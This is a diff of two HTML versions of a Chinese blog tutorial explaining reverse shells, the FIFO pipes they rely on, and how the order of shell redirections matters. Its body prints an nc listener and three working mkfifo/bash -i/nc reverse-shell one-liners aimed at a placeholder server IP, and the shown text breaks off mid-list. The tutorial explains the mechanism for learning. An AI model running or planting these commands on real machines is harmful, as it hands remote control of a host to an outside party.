@@ -1,689 +1,828 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+
+  
+
 <!DOCTYPE html>
-
-
-<html lang="zh-cn" data-theme="">
-<head>
+<html lang="zh-cn">
+  <head>
     
-        
-<meta charset="utf-8">
-<meta name="HandheldFriendly" content="True">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="referrer" content="no-referrer-when-downgrade">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.49 with theme Tranquilpeak 0.4.3-BETA">
+    <title>说一说反弹shell</title>
+    <meta name="author" content="singleye">
+    <meta name="keywords" content="ReverseShell, 反弹shell">
 
-<title>说一说反弹shell - singleye</title>
-
-<meta name="description" content="">
-
-
-    <meta name="keywords" content="ReverseShell,反弹shell">
-
-
-
-
-<link rel="icon" type="image/x-icon" href="https://www.singleye.net/favicon.ico">
-<link rel="apple-touch-icon-precomposed" href="https://www.singleye.net/favicon.png">
-
-
-
-
-
-
-
-
+    <link rel="icon" href="https://www.singleye.net/favicon.png">
     
 
-
-
-<style>
-  body {
-    visibility: hidden;
-    opacity: 0;
-  }
-</style>
-
-<noscript>
-  <style>
-    body {
-      visibility: visible;
-      opacity: 1;
-    }
-  </style>
-</noscript>
-
-
-
-
     
+    <meta name="description" content="
 
+">
+    <meta property="og:description" content="
 
+">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="说一说反弹shell">
+    <meta property="og:url" content="/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/">
+    <meta property="og:site_name" content="好奇心是探索未知世界的钥匙">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="好奇心是探索未知世界的钥匙">
+    <meta name="twitter:description" content="
 
-
-
-    
-    
-        
+">
     
     
 
     
-        <link rel="stylesheet" href="/css/style.min.184a655c5ad8596648622468e6696abf0cf0a2cf8266df17b4f7a36fe9c97551.css" integrity="sha256-GEplXFrYWWZIYiRo5mlqvwzwos&#43;CZt8XtPejb&#43;nJdVE=">
-    
-
-
-
-
-
-    
-
-
-
-
-
-    
-    
-        
-    
     
 
     
-        <link rel="stylesheet" href="/css/style.min.c4c04b3ef88e3d619ad4c7ee5e03048422bc55c4fefdc1f07657c1133670aa22.css" integrity="sha256-xMBLPviOPWGa1MfuXgMEhCK8VcT&#43;/cHwdlfBEzZwqiI=">
-    
-
-
-
-
-
-    
-
-
-
-
-
-    
-    
-        
-    
+      <meta property="og:image" content="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/images/avatar.png">
     
 
     
-        <link rel="stylesheet" href="/css/style.min.21c5d8fe0a79d623b0adc1ce4bd4f6dd2c05cd939c9aaaa966ba7186b1464f4d.css" integrity="sha256-IcXY/gp51iOwrcHOS9T23SwFzZOcmqqpZrpxhrFGT00=">
-    
-
-
-
-
-
-
-
-
-
-
-
-
-    
-
-    
-
-
-
-
-
-    
-    
-        
-    
-    
-
-    
-        <script src="/js/script.min.08f04d96386c73c9bf4d160333f8f448c05a6e01c06770542ee0e013954ce930.js" type="text/javascript" charset="utf-8" integrity="sha256-CPBNljhsc8m/TRYDM/j0SMBabgHAZ3BULuDgE5VM6TA="></script>
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
-</head>
-<body>
-    <a class="skip-main" href="#main">Skip to main content</a>
-    <div class="container">
-        <header class="common-header">
-            
-                <div class="header-top">
-    <div class="header-top-left">
-        <h1 class="site-title noselect">
-    <a href="/">singleye</a>
-</h1>
-
-        
-
-
-
-
-
-
-
-    
-        <div class="theme-switcher">
-            <span class="inline-svg">
-
-    
-
-
-    
-    
+      <meta property="og:image" content="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn.png">
     
     
     
 
-    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-sun-high"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg>
-
-
-</span>
-
-        </div>
     
 
-    <script>
-        const STORAGE_KEY = 'user-color-scheme'
-        const defaultTheme = "light"
-
-        let currentTheme
-        let switchButton
-        let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')
-
-        function switchTheme(e) {
-            currentTheme = (currentTheme === 'dark') ? 'light' : 'dark';
-            if (localStorage) localStorage.setItem(STORAGE_KEY, currentTheme);
-            document.documentElement.setAttribute('data-theme', currentTheme);
-            changeGiscusTheme(currentTheme);
-            document.body.dispatchEvent(new CustomEvent(currentTheme + "-theme-set"));
-        }
-
-        const autoChangeScheme = e => {
-            currentTheme = e.matches ? 'dark' : 'light'
-            document.documentElement.setAttribute('data-theme', currentTheme);
-            changeGiscusTheme(currentTheme);
-            document.body.dispatchEvent(new CustomEvent(currentTheme + "-theme-set"));
-        }
-
-        document.addEventListener('DOMContentLoaded', function () {
-            switchButton = document.querySelector('.theme-switcher')
-            currentTheme = detectCurrentScheme()
-
-            if (currentTheme === 'auto') {
-                autoChangeScheme(autoDefinedScheme);
-                autoDefinedScheme.addListener(autoChangeScheme);
-            } else {
-                document.documentElement.setAttribute('data-theme', currentTheme)
-            }
-
-            if (switchButton) {
-                switchButton.addEventListener('click', switchTheme, false)
-            }
-
-            showContent();
-        })
-
-        function detectCurrentScheme() {
-            if (localStorage !== null && localStorage.getItem(STORAGE_KEY)) {
-                return localStorage.getItem(STORAGE_KEY)
-            }
-            if (defaultTheme) {
-                return defaultTheme
-            }
-            return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-        }
-
-        function showContent() {
-            document.body.style.visibility = 'visible';
-            document.body.style.opacity = 1;
-        }
-
-        function changeGiscusTheme (theme) {
-            function sendMessage(message) {
-              const iframe = document.querySelector('iframe.giscus-frame');
-              if (!iframe) return;
-              iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
-            }
-
-            sendMessage({
-              setConfig: {
-                theme: theme
-              }
-            });
-        }
-    </script>
-
-
-        <ul class="social-icons noselect">
-
-
-
-
-
-
-
-    <li>
-            <a href="/index.xml" title="RSS" rel="me">
-            <span class="inline-svg">
-
     
-
-
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
     
     
-    
+    <link rel="stylesheet" href="https://www.singleye.net/css/style-xlk5y0ryj5axy7jbwodqvhtodmk0fc90eewtlacey1uvrjqw1eaqwgcyz4xb.min.css" />
     
     
 
-    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>
-
-
-</span>
-
-            </a>
-        </li>
     
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-90087618-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
 
-</ul>
-
-    </div>
-    <div class="header-top-right">
-
-    </div>
-</div>
-
-
-    <nav class="noselect">
-        
-        
-        <a class="" href="https://www.singleye.net/" title="">Home</a>
-        
-        <a class="" href="https://www.singleye.net/categories" title="">Categories</a>
-        
-        <a class="" href="https://www.singleye.net/tags" title="">Tags</a>
-        
-        <a class="" href="https://github.com/singleye" title="">GitHub</a>
-        
-    </nav>
-
-
-
+    
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
 <script>
   MathJax = {
     tex: {
-      inlineMath: [['$', '$'], ['\\(', '\\)']],
-      displayMath: [['$$','$$'], ['\\[', '\\]']],
-      processEscapes: true,
-      processEnvironments: true
-    },
-    options: {
-      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      displayMath: [['\\[', '\\]'], ['$$', '$$']],  
+      inlineMath: [['\$', '\$']]                  
     }
   };
-
-  window.addEventListener('load', (event) => {
-      document.querySelectorAll("mjx-container").forEach(function(x){
-        x.parentElement.classList += 'has-jax'})
-    });
-
 </script>
-<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-<script type="text/javascript" id="MathJax-script" async
-  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 
 
+  </head>
 
-
-
-            
-        </header>
-        <main id="main" tabindex="-1">
-            
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="2">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://www.singleye.net/">好奇心是探索未知世界的钥匙</a>
+  </div>
+  
     
-
-    <article class="post h-entry">
-        <div class="post-header">
-            <header>
-                <h1 class="p-name post-title">说一说反弹shell</h1>
-                
-
-            </header>
-            
-
-
-
-<div class="post-info noselect">
+      <a class="header-right-picture "
+         href="https://www.singleye.net/#about">
     
-        <div class="post-date dt-published">
-            <time datetime="2018-04-09">2018-04-09</time>
-            
-        </div>
     
+    
+      
+        <img class="header-picture" src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/images/avatar.png" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
 
-    <a class="post-hidden-url u-url" href="/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/">/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</a>
-    <a href="https://www.singleye.net/" class="p-name p-author post-hidden-author h-card" rel="me"></a>
+      <nav id="sidebar" data-behavior="2">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://www.singleye.net/#about">
+          <img class="sidebar-profile-picture" src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/images/avatar.png" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">singleye</h4>
+        
+          <h5 class="sidebar-profile-bio"><strong>Email:</strong> <a href="mailto:singleye512@gmail.com">singleye512@gmail.com</a></h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.singleye.net/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.singleye.net/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.singleye.net/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.singleye.net/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.singleye.net/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
 
 
-    <div class="post-taxonomies">
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/singleye" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.singleye.net/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="2"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      说一说反弹shell
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2018-04-09T23:59:32&#43;08:00">
         
-            <ul class="post-categories">
-                
-                    
-                    <li><a href="/categories/security/">Security</a></li>
-                
-            </ul>
-        
-        
-            <ul class="post-tags">
-                
-                    
-                    <li><a href="/tags/reverseshell/">#ReverseShell</a></li>
-                
-                    
-                    <li><a href="">#反弹shell</a></li>
-                
-            </ul>
-        
-        
-    </div>
+  四月 9, 2018
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://www.singleye.net/categories/security">Security</a>
+    
+  
+
+  </div>
+
 </div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1><nav id="TableOfContents">
+<ul>
+<li><a href="#什么是反弹shell">什么是反弹shell?</a></li>
+<li><a href="#建立反弹shell">建立反弹shell</a>
+<ul>
+<li><a href="#建立本地server">建立本地server</a></li>
+<li><a href="#建立远程client">建立远程client</a>
+<ul>
+<li><a href="#方法1-在远程被控机上用nc建立client进行连接">方法1: 在远程被控机上用nc建立client进行连接。</a></li>
+<li><a href="#方法2-在远程机上用建立连接">方法2:在远程机上用建立连接</a></li>
+<li><a href="#方法3">方法3:</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#其他话题">其他话题</a>
+<ul>
+<li><a href="#1-啥是fifo">1. 啥是FIFO？</a></li>
+<li><a href="#2-思考一下下面的两个命令有什么不同">2. 思考一下下面的两个命令有什么不同？</a></li>
+</ul></li>
+</ul>
+</nav>
 
-        </div>
-        
+<p></p>
 
-  
-  
-
-
-
-
-  
-  
-  
-  <details class="toc noselect">
-    <summary>Table of Contents</summary>
-    <div class="inner"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#建立本地server">建立本地server</a></li>
-    <li><a href="#建立远程client">建立远程client</a>
-      <ul>
-        <li><a href="#方法1-在远程被控机上用nc建立client进行连接">方法1: 在远程被控机上用nc建立client进行连接。</a></li>
-        <li><a href="#方法2在远程机上用建立连接">方法2:在远程机上用建立连接</a></li>
-        <li><a href="#方法3">方法3:</a></li>
-      </ul>
-    </li>
-  </ul>
-
-  <ul>
-    <li><a href="#1-啥是fifo">1. 啥是FIFO？</a></li>
-    <li><a href="#2-思考一下下面的两个命令有什么不同">2. 思考一下下面的两个命令有什么不同？</a></li>
-  </ul>
-</nav></div>
-  </details>
-  
-
-
-
-<script>
-  var toc = document.querySelector(".toc");
-  if (toc) {
-    toc.addEventListener("click", function () {
-      if (event.target.tagName !== "A") {
-        event.preventDefault();
-        if (this.open) {
-          this.open = false;
-          this.classList.remove("expanded");
-        } else {
-          this.open = true;
-          this.classList.add("expanded");
-        }
-      }
-    });
-  }
-</script>
-
-        <div class="content e-content">
-            <!--toc-->
 <p>今天简单研究了一下什么是反弹shell以及怎么构造反弹shell，简单总结一下。</p>
-<h1 id="什么是反弹shell" >
-<div>
-    <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8d%e5%bc%b9shell">
-        ##
-    </a>
-    什么是反弹shell?
-</div>
-</h1>
+
+<h1 id="什么是反弹shell">什么是反弹shell?</h1>
+
 <p>先说一下我是怎么理解反弹shell的。正常情况下从本地控制远程的一台机器可以通过远程登陆（比如ssh/telnet）从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell（也叫reverse shell）就是把方向反过来，从远程被控主机向本地建立连接，即远程被控机是client，本地是server。</p>
-<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn.png" alt="ReverseShell"></p>
-<h1 id="建立反弹shell" >
-<div>
-    <a href="#%e5%bb%ba%e7%ab%8b%e5%8f%8d%e5%bc%b9shell">
-        ##
-    </a>
-    建立反弹shell
-</div>
-</h1>
-<h2 id="建立本地server" >
-<div>
-    <a href="#%e5%bb%ba%e7%ab%8b%e6%9c%ac%e5%9c%b0server">
-        #
-    </a>
-    建立本地server
-</div>
-</h2>
+
+<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn.png" alt="ReverseShell" /></p>
+
+<h1 id="建立反弹shell">建立反弹shell</h1>
+
+<h2 id="建立本地server">建立本地server</h2>
+
 <p>使用&rsquo;nc&rsquo;在本地建立server进行网络连接监听，本例子监听在8888端口上。</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nc -lvp <span style="color:#ff9f43">8888</span>
-</span></span></code></pre></div><h2 id="建立远程client" >
-<div>
-    <a href="#%e5%bb%ba%e7%ab%8b%e8%bf%9c%e7%a8%8bclient">
-        #
-    </a>
-    建立远程client
-</div>
-</h2>
-<h3 id="方法1-在远程被控机上用nc建立client进行连接" >
-<div>
-    <a href="#%e6%96%b9%e6%b3%951-%e5%9c%a8%e8%bf%9c%e7%a8%8b%e8%a2%ab%e6%8e%a7%e6%9c%ba%e4%b8%8a%e7%94%a8nc%e5%bb%ba%e7%ab%8bclient%e8%bf%9b%e8%a1%8c%e8%bf%9e%e6%8e%a5">
-        ##
-    </a>
-    方法1: 在远程被控机上用nc建立client进行连接。
-</div>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ mkfifo /tmp/f
-</span></span><span style="display:flex;"><span>$ cat /tmp/f | bash -i 2&gt;&amp;<span style="color:#ff9f43">1</span> | nc &lt;Server IP&gt; <span style="color:#ff9f43">8888</span> &gt; /tmp/f
-</span></span></code></pre></div><ol>
-<li>**&lsquo;mkfifo /tmp/f&rsquo;**创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另外一端读取写入的内容。</li>
-<li>**&lsquo;cat /tmp/f&rsquo;**读取有名管道中的内容，读取的内容通过管道&rsquo;|&lsquo;写入&rsquo;bash&rsquo;</li>
-<li>**&lsquo;bash -i 2&gt;&amp;1&rsquo;**建立交互式shell，并把标准错误合并到标准输出，然后通过管道&rsquo;|&lsquo;发给&rsquo;nc&rsquo;客户端</li>
-<li>**&rsquo;nc <Server IP> 8888 &gt; /tmp/f&rsquo;**向server发起连接，并把从server端接收到的内容写入&rsquo;/tmp/f&rsquo;，注意，这些写到&rsquo;/tmp/f&rsquo;的内容又被上面步骤'2&rsquo;读出来写会给shell</li>
+
+<pre><code class="language-sh">$ nc -lvp 8888
+</code></pre>
+
+<h2 id="建立远程client">建立远程client</h2>
+
+<h3 id="方法1-在远程被控机上用nc建立client进行连接">方法1: 在远程被控机上用nc建立client进行连接。</h3>
+
+<pre><code class="language-sh">$ mkfifo /tmp/f
+$ cat /tmp/f | bash -i 2&gt;&amp;1 | nc &lt;Server IP&gt; 8888 &gt; /tmp/f
+</code></pre>
+
+<ol>
+<li><strong>&lsquo;mkfifo /tmp/f&rsquo;</strong>创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另外一端读取写入的内容。</li>
+<li><strong>&lsquo;cat /tmp/f&rsquo;</strong>读取有名管道中的内容，读取的内容通过管道&rsquo;|&lsquo;写入&rsquo;bash&rsquo;</li>
+<li><strong>&lsquo;bash -i 2&gt;&amp;1&rsquo;</strong>建立交互式shell，并把标准错误合并到标准输出，然后通过管道&rsquo;|&lsquo;发给&rsquo;nc&rsquo;客户端</li>
+<li><strong>&lsquo;nc <Server IP> 8888 &gt; /tmp/f&rsquo;</strong>向server发起连接，并把从server端接收到的内容写入&rsquo;/tmp/f&rsquo;，注意，这些写到&rsquo;/tmp/f&rsquo;的内容又被上面步骤&rsquo;2&rsquo;读出来写会给shell</li>
 </ol>
+
 <p>好吧，是不是有些绕？再捋一下，前面的那一串命令建立了一个连接，该连接通过&rsquo;nc&rsquo;与server端进行连接，server端的输入会被发送到client端的&rsquo;nc&rsquo;并写入&rsquo;/tmp/f&rsquo;，之后被&rsquo;cat&rsquo;读出来发给shell执行。shell的执行输出通过&rsquo;nc&rsquo;发给server。连接的图示如下：</p>
-<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-001.png" alt="示意图"></p>
-<h3 id="方法2在远程机上用建立连接" >
-<div>
-    <a href="#%e6%96%b9%e6%b3%952%e5%9c%a8%e8%bf%9c%e7%a8%8b%e6%9c%ba%e4%b8%8a%e7%94%a8%e5%bb%ba%e7%ab%8b%e8%bf%9e%e6%8e%a5">
-        ##
-    </a>
-    方法2:在远程机上用建立连接
-</div>
-</h3>
+
+<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-001.png" alt="示意图" /></p>
+
+<h3 id="方法2-在远程机上用建立连接">方法2:在远程机上用建立连接</h3>
+
 <p>前面的方法1中不太简洁的地方是使用了‘cat’，那么能不能再简化一下呢？当然有！先画一张连接拓扑图。</p>
-<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-002.png" alt="示意图"></p>
+
+<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-002.png" alt="示意图" /></p>
+
 <p>建立方法命令如下：</p>
-<pre tabindex="0"><code>mkfifo /tmp/f
+
+<pre><code>mkfifo /tmp/f
 bash -i 2&gt;&amp;1 &lt; /tmp/f | nc &lt;Server IP&gt; 8888 &gt; /tmp/f
-</code></pre><h3 id="方法3" >
-<div>
-    <a href="#%e6%96%b9%e6%b3%953">
-        ##
-    </a>
-    方法3:
-</div>
-</h3>
+</code></pre>
+
+<h3 id="方法3">方法3:</h3>
+
 <p>了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。</p>
-<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-003.png" alt="示意图"></p>
+
+<p><img src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-003.png" alt="示意图" /></p>
+
 <p>建立连接方法如下：</p>
-<pre tabindex="0"><code>mkfifo /tmp/f
+
+<pre><code>mkfifo /tmp/f
 nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i  &gt; /tmp/f 2&gt;&amp;1
-</code></pre><h1 id="其他话题" >
-<div>
-    <a href="#%e5%85%b6%e4%bb%96%e8%af%9d%e9%a2%98">
-        ##
-    </a>
-    其他话题
-</div>
-</h1>
-<h2 id="1-啥是fifo" >
-<div>
-    <a href="#1-%e5%95%a5%e6%98%affifo">
-        #
-    </a>
-    1. 啥是FIFO？
-</div>
-</h2>
+</code></pre>
+
+<h1 id="其他话题">其他话题</h1>
+
+<h2 id="1-啥是fifo">1. 啥是FIFO？</h2>
+
 <p>“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：</p>
+
 <ol>
 <li>都是进程间通讯的手段，可用于传递消息</li>
 <li>都是“半双工单向”数据流模式</li>
 </ol>
+
 <p>但不同之处在于：</p>
+
 <ol>
 <li>“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。</li>
 <li>“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。</li>
 </ol>
+
 <p>想知道的更详细些可以阅读经典的《UNIX环境高级编程》。</p>
-<h2 id="2-思考一下下面的两个命令有什么不同" >
-<div>
-    <a href="#2-%e6%80%9d%e8%80%83%e4%b8%80%e4%b8%8b%e4%b8%8b%e9%9d%a2%e7%9a%84%e4%b8%a4%e4%b8%aa%e5%91%bd%e4%bb%a4%e6%9c%89%e4%bb%80%e4%b9%88%e4%b8%8d%e5%90%8c">
-        #
-    </a>
-    2. 思考一下下面的两个命令有什么不同？
-</div>
-</h2>
-<pre tabindex="0"><code>nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i 2&gt;&amp;1 &gt; /tmp/f
+
+<h2 id="2-思考一下下面的两个命令有什么不同">2. 思考一下下面的两个命令有什么不同？</h2>
+
+<pre><code>nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i 2&gt;&amp;1 &gt; /tmp/f
 
 nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i  &gt; /tmp/f 2&gt;&amp;1
-</code></pre><p>不同之处是**&ldquo;2&gt;&amp;1 &gt; /tmp/f&rdquo;<strong>和</strong>&quot;&gt; /tmp/f 2&gt;&amp;1&quot;**。</p>
-<p>**&quot;&gt; /tmp/f 2&gt;&amp;1&quot;<strong>可以正确将标准输出与标准错误合并后导入&quot;/tmp/f&quot;，而</strong>&ldquo;2&gt;&amp;1 &gt; /tmp/f&rdquo;**最终只把标准输出导入了&quot;/tmp/f&quot;，标准错误还是没有，那么是为什么呢？</p>
-<p>先分析一下正常**&quot;&gt; /tmp/f 2&gt;&amp;1&quot;**的执行过程。</p>
+</code></pre>
+
+<p>不同之处是<strong>&ldquo;2&gt;&amp;1 &gt; /tmp/f&rdquo;</strong>和<strong>&rdquo;&gt; /tmp/f 2&gt;&amp;1&rdquo;</strong>。</p>
+
+<p><strong>&rdquo;&gt; /tmp/f 2&gt;&amp;1&rdquo;</strong>可以正确将标准输出与标准错误合并后导入&rdquo;/tmp/f&rdquo;，而<strong>&ldquo;2&gt;&amp;1 &gt; /tmp/f&rdquo;</strong>最终只把标准输出导入了&rdquo;/tmp/f&rdquo;，标准错误还是没有，那么是为什么呢？</p>
+
+<p>先分析一下正常<strong>&rdquo;&gt; /tmp/f 2&gt;&amp;1&rdquo;</strong>的执行过程。</p>
+
 <ol>
-<li>先解析**&quot;&gt; /tmp/f&quot;**的时候进程会把标准输出&quot;1&quot;定向到FIFO文件&quot;/tmp/f&quot;</li>
-<li>再解析**&ldquo;2&gt;&amp;1&rdquo;**的时候，进程的标准错误“2”定向到了标准输出“1”对应的目标，由于此时“1”指向了&quot;/tmp/f&quot;，那么自然标准错误“2”也被定向到了这个FIFO文件。</li>
+<li>先解析<strong>&rdquo;&gt; /tmp/f&rdquo;</strong>的时候进程会把标准输出&rdquo;1&rdquo;定向到FIFO文件&rdquo;/tmp/f&rdquo;</li>
+<li>再解析<strong>&ldquo;2&gt;&amp;1&rdquo;</strong>的时候，进程的标准错误“2”定向到了标准输出“1”对应的目标，由于此时“1”指向了&rdquo;/tmp/f&rdquo;，那么自然标准错误“2”也被定向到了这个FIFO文件。</li>
 </ol>
-<p>再分析一下异常**&ldquo;2&gt;&amp;1 &gt; /tmp/f&rdquo;**的执行过程。</p>
+
+<p>再分析一下异常<strong>&ldquo;2&gt;&amp;1 &gt; /tmp/f&rdquo;</strong>的执行过程。</p>
+
 <ol>
-<li>首先**&ldquo;2&gt;&amp;1&rdquo;**在执行的时候是把进程的标准错误“2”定向到了标准输出“1”对应的目标，这个目标此时是进程执行的“终端”。</li>
-<li>当解析到**&quot;&gt; /tmp/f&quot;**的时候进程会把标准输出&quot;1&quot;定向到FIFO文件&quot;/tmp/f&quot;，而此时标准错误“2”还是指向前一步中定向的“终端”，因此造成了执行的问题。</li>
+<li>首先<strong>&ldquo;2&gt;&amp;1&rdquo;</strong>在执行的时候是把进程的标准错误“2”定向到了标准输出“1”对应的目标，这个目标此时是进程执行的“终端”。</li>
